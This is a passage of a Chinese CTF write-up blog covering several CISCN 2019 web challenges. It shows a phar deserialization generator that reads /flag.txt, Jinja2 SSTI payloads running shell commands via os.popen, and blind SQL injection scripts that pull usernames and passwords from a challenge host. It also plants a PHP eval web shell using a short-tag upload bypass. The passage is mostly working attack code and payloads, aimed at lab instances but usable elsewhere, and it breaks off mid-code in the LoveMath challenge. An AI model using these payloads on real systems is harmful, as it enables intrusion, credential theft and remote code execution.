    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition: attachment; filename="</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"File not exist"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>class.php中的Filelist类中的__destruct可以读取任意文件</p>
<p>class.php中的delete函数使用了unlink函数</p>
<p>delete.php中又调用了delete函数</p>
<p>phar反序列化利用的三个条件，所以可以使用phar反序列化来获取flag</p>
<h5 id="生成phar文件"><a href="#生成phar文件" class="headerlink" title="生成phar文件"></a>生成phar文件</h5><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
    <span class="token keyword">class</span> <span class="token class-name">User</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> 
      <span class="token keyword">class</span> <span class="token class-name">File</span> <span class="token punctuation">{</span>
        <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">class</span> <span class="token class-name">FileList</span> <span class="token punctuation">{</span>
        <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
        <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span> <span class="token operator">=</span> <span class="token string">"/flag.txt"</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">files</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$o</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$o</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">db</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">FileList</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    @<span class="token function">unlink</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Phar</span><span class="token punctuation">(</span><span class="token string">"phar.phar"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">startBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setStub</span><span class="token punctuation">(</span><span class="token string">"&lt;?php __HALT_COMPILER(); ?>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">setMetadata</span><span class="token punctuation">(</span><span class="token variable">$o</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">addFromString</span><span class="token punctuation">(</span><span class="token string">"exp.txt"</span><span class="token punctuation">,</span> <span class="token string">"test"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
    <span class="token variable">$phar</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">stopBuffering</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter">?></span></code></pre>
<p>这里要用php5</p>
<p>并在php.ini中设置phar.readonly = Off</p>
<p>生成的phar文件后缀改为jpg</p>
<p>接下来再点击删除文件，将文件名改为phar://phar.jpg即可获得flag</p>
<p><img src="/2021/07/22/ciscn-2019-dropbox/image-20210724222920804.png" alt="image-20210724222920804"></p>
]]></content>
  </entry>
  <entry>
    <title>CISCN：2019-DoubleSecret</title>
    <url>/2021/08/13/ciscn-2019-doublesecret/</url>
    <content><![CDATA[<p><img src="/2021/08/13/ciscn-2019-doublesecret/image-20210816005421276.png" alt="image-20210816005421276"></p>
<p>访问secret</p>
<p><img src="/2021/08/13/ciscn-2019-doublesecret/image-20210816010347200.png" alt="image-20210816010347200"></p>
<p>传递secret</p>
<p><img src="/2021/08/13/ciscn-2019-doublesecret/image-20210816010447640.png" alt="image-20210816010447640"></p>
<p>app.py</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">if</span><span class="token punctuation">(</span>secret<span class="token operator">==</span>None<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'Tell me your secret.I will encrypt it so others can\'t see'</span>
    rc<span class="token operator">=</span>rc4_Modified<span class="token punctuation">.</span>RC4<span class="token punctuation">(</span><span class="token string">"HereIsTreasure"</span><span class="token punctuation">)</span>   <span class="token comment" spellcheck="true">#解密</span>
    deS<span class="token operator">=</span>rc<span class="token punctuation">.</span>do_crypt<span class="token punctuation">(</span>secret<span class="token punctuation">)</span>

    a<span class="token operator">=</span>render_template_string<span class="token punctuation">(</span>safe<span class="token punctuation">(</span>deS<span class="token punctuation">)</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> <span class="token string">'ciscn'</span> <span class="token keyword">in</span> a<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'flag detected!'</span>
    <span class="token keyword">return</span> a
Open an interactive python shell <span class="token keyword">in</span> this frame</code></pre>
<p>此处调用了rc4再通过render_template_string执行</p>
<p>rc4加密脚本并进行url编码。</p>
<p>最下方的key表示密钥，运行时只需要输入你的ssti的payload，即可得到加密。</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> base64
<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse

<span class="token keyword">def</span> <span class="token function">rc4_main</span><span class="token punctuation">(</span>key <span class="token operator">=</span> <span class="token string">"init_key"</span><span class="token punctuation">,</span> message <span class="token operator">=</span> <span class="token string">"init_message"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#返回加密后得内容</span>
    s_box <span class="token operator">=</span> rc4_init_sbox<span class="token punctuation">(</span>key<span class="token punctuation">)</span>
    crypt <span class="token operator">=</span> str<span class="token punctuation">(</span>rc4_excrypt<span class="token punctuation">(</span>message<span class="token punctuation">,</span> s_box<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span>  crypt

<span class="token keyword">def</span> <span class="token function">rc4_init_sbox</span><span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">:</span>
    s_box <span class="token operator">=</span> list<span class="token punctuation">(</span>range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">)</span> 
    j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> ord<span class="token punctuation">(</span>key<span class="token punctuation">[</span>i <span class="token operator">%</span> len<span class="token punctuation">(</span>key<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> s_box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
    <span class="token keyword">return</span> s_box
<span class="token keyword">def</span> <span class="token function">rc4_excrypt</span><span class="token punctuation">(</span>plain<span class="token punctuation">,</span> box<span class="token punctuation">)</span><span class="token punctuation">:</span>
    res <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    i <span class="token operator">=</span> j <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">for</span> s <span class="token keyword">in</span> plain<span class="token punctuation">:</span>
        i <span class="token operator">=</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        j <span class="token operator">=</span> <span class="token punctuation">(</span>j <span class="token operator">+</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        box<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">,</span> box<span class="token punctuation">[</span>i<span class="token punctuation">]</span>
        t <span class="token operator">=</span> <span class="token punctuation">(</span>box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> box<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">256</span>
        k <span class="token operator">=</span> box<span class="token punctuation">[</span>t<span class="token punctuation">]</span>
        res<span class="token punctuation">.</span>append<span class="token punctuation">(</span>chr<span class="token punctuation">(</span>ord<span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">^</span> k<span class="token punctuation">)</span><span class="token punctuation">)</span>
    cipher <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>res<span class="token punctuation">)</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>str<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

key <span class="token operator">=</span> <span class="token string">"HereIsTreasure"</span>  <span class="token comment" spellcheck="true">#此处为密文</span>
message <span class="token operator">=</span> input<span class="token punctuation">(</span><span class="token string">"请输入明文:\n"</span><span class="token punctuation">)</span>
enc_base64 <span class="token operator">=</span> rc4_main<span class="token punctuation">(</span> key <span class="token punctuation">,</span> message <span class="token punctuation">)</span>
enc_init <span class="token operator">=</span> str<span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>enc_base64<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span>
enc_url <span class="token operator">=</span> parse<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>enc_init<span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"rc4加密后的url编码:"</span><span class="token operator">+</span>enc_url<span class="token punctuation">)</span>
<span class="token comment" spellcheck="true">#print("rc4加密后的base64编码"+enc_base64)</span></code></pre>
<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}{% endif %}{% endfor %}</code></pre>
<pre><code>.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5/%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%9C%1A%3A%3F%C3%A6%C2%B2%20%C2%A2%C3%82%C2%B9%0F%0B%C3%95G%23-%C3%A9%C2%A2%19%C3%85%C2%B2%C2%8F%22%C3%AE%C2%A3%C2%93l%C3%8A%7B%03%C3%B9%C2%B6%C2%92%C3%97%11%20%C3%9C%C3%AE%C3%AA%02</code></pre>
<p><img src="/2021/08/13/ciscn-2019-doublesecret/image-20210816182152396.png" alt="image-20210816182152396"></p>
<pre><code>{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('cat /flag.txt').read()")}}{% endif %}{% endfor %}</code></pre>
<pre><code>.J%19S%C2%A5%15Km%2B%C2%94%C3%96S%C2%85%C2%8F%C2%B8%C2%97%0B%C2%90X5%C2%A4A%C3%9FMD%C2%AE%07%C2%8BS%C3%9F7%C3%98%12%C3%85r%C3%A9%1B%C3%A4%2A%C3%A7w%C3%9B%C2%9E%C3%B1h%1D%C2%82%25%C3%AD%C3%B4%06%29%7F%C3%B0o%2C%C2%9E9%08%C3%87%C3%B7u.%C3%BB%C2%95%14%C2%BFv%05%19j%C2%AEL%C3%9A-%C3%A3t%C2%AC%7FX%2C8L%C2%81%C3%91H%C3%BF%C3%B6%C3%A3%C3%9A%C3%B5%C2%9A%C2%A6%23%06%C2%A7%C2%B8%C2%BB%C2%B9%C3%A6ny%C3%98%C3%8Aj%C2%BB%25X%15%C3%97%C2%84F%24%1As%5E%C2%9B%C3%97%C2%A4%20j%C2%A5/%17%1C%C3%9Fs%C2%AF6%C3%85%C2%A5%C2%B1.%C3%A8%C2%A2Y%21%C2%A8%C3%A0%10%C2%8Aa%5D%5C%2B%C3%8E%C2%B0%C2%99%C3%A0%C2%BE%C2%87-%10x%20%5D%C3%9A%0B%C2%882P%C3%A3%C3%93%08n0%C3%AE%C3%BDb%C2%B1%C3%80%C3%B6%1F%5B%C2%88B%23%7E%C3%A6%C2%BC%5D%C2%81%C3%BF%C3%88d%C2%AE%C2%B8%C3%8E2%C2%92%20C%C2%B7%C2%B7%C2%95%C3%95Wj%C3%93%C2%B5%C3%AA_%C2%A1%2B%C2%87%C2%B5l%08%27%3F%C3%96</code></pre>
<p><img src="/2021/08/13/ciscn-2019-doublesecret/image-20210816182246351.png" alt="image-20210816182246351"></p>
<p><img src="/2021/08/13/ciscn-2019-doublesecret/image-20210816182227523.png" alt="image-20210816182227523"></p>
]]></content>
  </entry>
  <entry>
    <title>CISCN:2019-Easyweb</title>
    <url>/2021/07/26/ciscn-2019-easyweb/</url>
    <content><![CDATA[<h5 id="robots-txt"><a href="#robots-txt" class="headerlink" title="robots.txt"></a>robots.txt</h5><p><img src="/2021/07/26/ciscn-2019-easyweb/1.png" alt="1"></p>
<p>尝试后获取到image.php.bak文件</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span>

<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"id"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">"1"</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">?</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token string">""</span><span class="token punctuation">;</span>

<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token function">addslashes</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$id</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"\\0"</span><span class="token punctuation">,</span><span class="token string">"%00"</span><span class="token punctuation">,</span><span class="token string">"\\'"</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$id</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$path</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"\\0"</span><span class="token punctuation">,</span><span class="token string">"%00"</span><span class="token punctuation">,</span><span class="token string">"\\'"</span><span class="token punctuation">,</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$con</span><span class="token punctuation">,</span><span class="token string">"select * from images where id='{$id}' or path='{$path}'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$row</span><span class="token operator">=</span><span class="token function">mysqli_fetch_array</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">,</span><span class="token constant">MYSQLI_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token variable">$path</span><span class="token operator">=</span><span class="token string">"./"</span> <span class="token punctuation">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string">"path"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Type: image/jpeg"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>addslashes,过滤</p>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span>  requests

url <span class="token operator">=</span> <span class="token string">"http://ecc89072-42aa-401e-a614-4dd0ea819943.node4.buuoj.cn/image.php?id=\\0&amp;path="</span>
payload <span class="token operator">=</span> <span class="token string">"or id=if(ascii(substr((select username from users),{0},1))>{1},1,0)%23"</span>
result <span class="token operator">=</span> <span class="token string">""</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    l <span class="token operator">=</span> <span class="token number">1</span>
    r <span class="token operator">=</span> <span class="token number">130</span>
    mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
    <span class="token keyword">while</span><span class="token punctuation">(</span>l<span class="token operator">&lt;</span>r<span class="token punctuation">)</span><span class="token punctuation">:</span>
        payloads <span class="token operator">=</span> payload<span class="token punctuation">.</span>format<span class="token punctuation">(</span>i<span class="token punctuation">,</span>mid<span class="token punctuation">)</span>
        <span class="token keyword">print</span><span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>
        html <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">+</span>payloads<span class="token punctuation">)</span>
        <span class="token keyword">if</span> <span class="token string">"JFIF"</span> <span class="token keyword">in</span> html<span class="token punctuation">.</span>text<span class="token punctuation">:</span>
            l <span class="token operator">=</span> mid <span class="token operator">+</span><span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            r <span class="token operator">=</span> mid
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>l <span class="token operator">+</span> r<span class="token punctuation">)</span><span class="token operator">>></span><span class="token number">1</span>
    result<span class="token operator">+=</span>chr<span class="token punctuation">(</span>mid<span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre>
<pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requests

url <span class="token operator">=</span> r<span class="token string">'http://ecc89072-42aa-401e-a614-4dd0ea819943.node4.buuoj.cn/image.php'</span>
result <span class="token operator">=</span> <span class="token string">''</span>

<span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    high <span class="token operator">=</span> <span class="token number">127</span>
    low <span class="token operator">=</span> <span class="token number">32</span>
    mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>
    <span class="token keyword">while</span> high <span class="token operator">></span> low<span class="token punctuation">:</span>
        payload <span class="token operator">=</span> <span class="token string">" or id=if(ascii(substr((select password from users limit 1 offset 0),%d,1))>%d,1,0)#"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>x<span class="token punctuation">,</span> mid<span class="token punctuation">)</span>
        params <span class="token operator">=</span> <span class="token punctuation">{</span>
            <span class="token string">'id'</span><span class="token punctuation">:</span><span class="token string">'\\\\0'</span><span class="token punctuation">,</span>
            <span class="token string">'path'</span><span class="token punctuation">:</span>payload
        <span class="token punctuation">}</span>
        response <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>params<span class="token punctuation">)</span>
        <span class="token keyword">if</span> b<span class="token string">'JFIF'</span> <span class="token keyword">in</span> response<span class="token punctuation">.</span>content<span class="token punctuation">:</span>
            low <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            high <span class="token operator">=</span> mid
        mid <span class="token operator">=</span> <span class="token punctuation">(</span>low <span class="token operator">+</span> high<span class="token punctuation">)</span> <span class="token operator">//</span> <span class="token number">2</span>

    result <span class="token operator">+=</span> chr<span class="token punctuation">(</span>int<span class="token punctuation">(</span>mid<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span></code></pre>
<pre><code>admin
952e152f6e0fcacecee4</code></pre>
<p>登录</p>
<p><img src="/2021/07/26/ciscn-2019-easyweb/2.png" alt="2"></p>
<p>因为不允许上传带php的文件名，我们用php短标签来绕过<br> <code>&lt;?php @eval($_POST['a']);?&gt;</code>可以用<code>&lt;?=@eval($_POST['a']);?&gt;</code>来代替</p>
<p>文件后缀该为log会变为php</p>
<p><img src="/2021/07/26/ciscn-2019-easyweb/3.png" alt="3"></p>
<p><a href="http://ecc89072-42aa-401e-a614-4dd0ea819943.node4.buuoj.cn/logs/upload.c415dd0f21035fea682165a2b0be676e.log.php">http://ecc89072-42aa-401e-a614-4dd0ea819943.node4.buuoj.cn/logs/upload.c415dd0f21035fea682165a2b0be676e.log.php</a></p>
<p>蚁剑连接</p>
]]></content>
  </entry>
  <entry>
    <title>CISCN:2019-LoveMath</title>
    <url>/2021/07/06/ciscn-2019-lovemath/</url>
    <content><![CDATA[<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment" spellcheck="true">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>
    <span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>
    <span class="token comment" spellcheck="true">//例子 c=20-1</span>
    <span class="token variable">$content</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$content</span><span class="token punctuation">)</span> <span class="token operator">>=</span> <span class="token number">80</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"太长了不会算"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token variable">$blacklist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">'\n'</span><span class="token punctuation">,</span><span class="token string">'\''</span><span class="token punctuation">,</span> <span class="token string">'"'</span><span class="token punctuation">,</span> <span class="token string">'`'</span><span class="token punctuation">,</span> <span class="token string">'\['</span><span class="token punctuation">,</span> <span class="token string">'\]'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$blacklist</span> <span class="token keyword">as</span> <span class="token variable">$blackitem</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/'</span> <span class="token punctuation">.</span> <span class="token variable">$blackitem</span> <span class="token punctuation">.</span> <span class="token string">'/m'</span><span class="token punctuation">,</span> <span class="token variable">$content</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"请不要输入奇奇怪怪的字符"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token comment" spellcheck="true">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span>
    <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'abs'</span><span class="token punctuation">,</span> <span class="token string">'acos'</span><span class="token punctuation">,</span> <span class="token string">'acosh'</span><span class="token punctuation">,</span> <span class="token string">'asin'</span><span class="token punctuation">,</span> <span class="token string">'asinh'</span><span class="token punctuation">,</span> <span class="token string">'atan2'</span><span class="token punctuation">,</span> <span class="token string">'atan'</span><span class="token punctuation">,</span> <span class="token string">'atanh'</span><span class="token punctuation">,</span> <span class="token string">'base_convert'</span><span class="token punctuation">,</span> <span class="token string">'bindec'</span><span class="token punctuation">,</span> <span class="token string">'ceil'</span><span class="token punctuation">,</span> <span class="token string">'cos'</span><span class="token punctuation">,</span> <span class="token string">'cosh'</span><span class="token punctuation">,</span> <span class="token string">'decbin'</span><span class="token punctuation">,</span> <span class="token string">'dechex'</span><span class="token punctuation">,</span> <span class="token string">'decoct'</span><span class="token punctuation">,</span> <span class="token string">'deg2rad'</span><span class="token punctuation">,</span> <span class="token string">'exp'</span><span class="token punctuation">,</span> <span class="token string">'expm1'</span><span class="token punctuation">,</span> <span class="token string">'floor'</span><span class="token punctuation">,</span> <span class="token string">'fmod'</span><span class="token punctuation">,</span> <span class="token string">'getrandmax'</span><span class="token punctuation">,</span> <span class="token string">'hexdec'</span><span class="token punctuation">,</span> <span class="token string">'hypot'</span><span class="token punctuation">,</span> <span class="token string">'is_finite'</span><span class="token punctuation">,</span> <span class="token string">'is_infinite'</span><span class="token punctuation">,</span> <span class="token string">'is_nan'</span><span class="token punctuation">,</span> <span class="token string">'lcg_value'</span><span class="token punctuation">,</span> <span class="token string">'log10'</span><span class="token punctuation">,</span> <span class="token string">'log1p'</span><span class="token punctuation">,</span> <span class="token string">'log'</span><span class="token punctuation">,</span> <span class="token string">'max'</span><span class="token punctuation">,</span> 